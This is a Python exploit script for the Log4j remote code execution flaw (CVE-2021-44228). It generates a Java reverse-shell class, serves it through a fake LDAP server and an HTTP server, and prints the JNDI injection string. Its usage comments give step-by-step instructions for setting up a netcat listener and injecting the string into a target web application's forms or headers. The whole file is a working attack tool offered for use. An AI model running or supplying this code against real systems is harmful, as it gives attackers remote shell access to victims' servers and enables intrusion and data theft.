#!/usr/bin/env python3
# Apache Log4j RCE Exploit (CVE-2021-44228)
# Fixed version with proper indentation and syntax

# Usage 

# Step 1: 
# sudo apt update
# sudo apt install openjdk-8-jdk -y
# mkdir -p jdk1.8.0_20/bin
# ln -s $(which java) jdk1.8.0_20/bin/java

# Step 2:
# git clone https://github.com/mbechler/marshalsec
# cd marshalsec
# mvn clean package -DskipTests
# cp target/marshalsec-*.jar ../target/marshalsec-0.0.3-SNAPSHOT-all.jar
# cd ..

# Step 3:
# sudo python3 apache.py --userip VULNERABLE_IP --webport 80 --lport 4444
# nc -lvnp 4444

# Step 4:
# Find an input field in the target web app where you can inject this (e.g., login forms, search boxes, HTTP headers like User-Agent, X-Forwarded-For, etc.).

import subprocess
import sys
import argparse
from colorama import Fore, init
import threading
from http.server import HTTPServer, SimpleHTTPRequestHandler

init(autoreset=True)

def listToString(s):
    str1 = ""
    try:
        for ele in s:
            str1 += ele
        return str1
    except Exception as ex:
        parser.print_help()
        sys.exit()

def payload(userip, webport, lport):
    genExploit = ("""
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class Exploit {
    public Exploit() throws Exception {
        String host="%s";
        int port=%s;
        String cmd="/bin/sh";
        Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
        Socket s=new Socket(host,port);
        InputStream pi=p.getInputStream(), pe=p.getErrorStream(), si=s.getInputStream();
        OutputStream po=p.getOutputStream(), so=s.getOutputStream();
        while(!s.isClosed()) {
            while(pi.available()>0)
                so.write(pi.read());
            while(pe.available()>0)
                so.write(pe.read());
            while(si.available()>0)
                po.write(si.read());
            so.flush();
            po.flush();
            Thread.sleep(50);
            try {
                p.exitValue();
                break;
            }
            catch (Exception e) {
                // Continue
            }
        };
        p.destroy();
        s.close();
    }
}
""") % (userip, lport)

    try:
        with open("Exploit.java", "w") as f:
            f.write(genExploit)
        print(Fore.GREEN + '[+] Exploit java class created successfully')
    except Exception as e:
        print(Fore.RED + f'[-] Something went wrong: {e}')
        sys.exit(1)

    checkJavaAvailable()
    print(Fore.GREEN + '[+] Setting up fake LDAP server\n')

    t1 = threading.Thread(target=createLdapServer, args=(userip, webport))
    t1.start()

    httpd = HTTPServer(('0.0.0.0', int(webport)), SimpleHTTPRequestHandler)
    print(Fore.GREEN + f'[+] Starting HTTP server on port {webport}')
    httpd.serve_forever()

def checkJavaAvailable():
    try:
        javaver = subprocess.call(['./jdk1.8.0_20/bin/java', '-version'], 
                                stderr=subprocess.DEVNULL, 
                                stdout=subprocess.DEVNULL)
        if javaver != 0:
            print(Fore.RED + '[-] Java is not installed or not in the expected path')
            sys.exit(1)
    except Exception as e:
        print(Fore.RED + f'[-] Error checking Java: {e}')
        sys.exit(1)

def createLdapServer(userip, webport):
    sendme = "${jndi:ldap://%s:1389/a}" % userip
    print(Fore.GREEN + f"[+] Send me: {sendme}\n")

    try:
        subprocess.run(["./jdk1.8.0_20/bin/javac", "Exploit.java"], check=True)
        url = f"http://{userip}:{webport}/#Exploit"
        subprocess.run([
            "./jdk1.8.0_20/bin/java",
            "-cp",
            "target/marshalsec-0.0.3-SNAPSHOT-all.jar",
            "marshalsec.jndi.LDAPRefServer",
            url
        ])
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"[-] Error compiling or running LDAP server: {e}")
        sys.exit(1)

def header():
    print(Fore.BLUE + """
[!] CVE: CVE-2021-44228
[!] Log4j Remote Code Execution Exploit
[!] Original PoC from: https://github.com/kozmer/log4j-shell-poc
""")

if __name__ == "__main__":
    header()
    try:
        parser = argparse.ArgumentParser(description='Log4j RCE Exploit')
        parser.add_argument('--userip', required=True, help='Attacker IP for LDAP server')
        parser.add_argument('--webport', required=True, help='HTTP port for serving payload')
        parser.add_argument('--lport', required=True, help='Port for reverse shell')
        
        args = parser.parse_args()
        
        payload(args.userip, args.webport, args.lport)
        
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Exploit interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(Fore.RED + f"[-] Error: {e}")
        sys.exit(1)
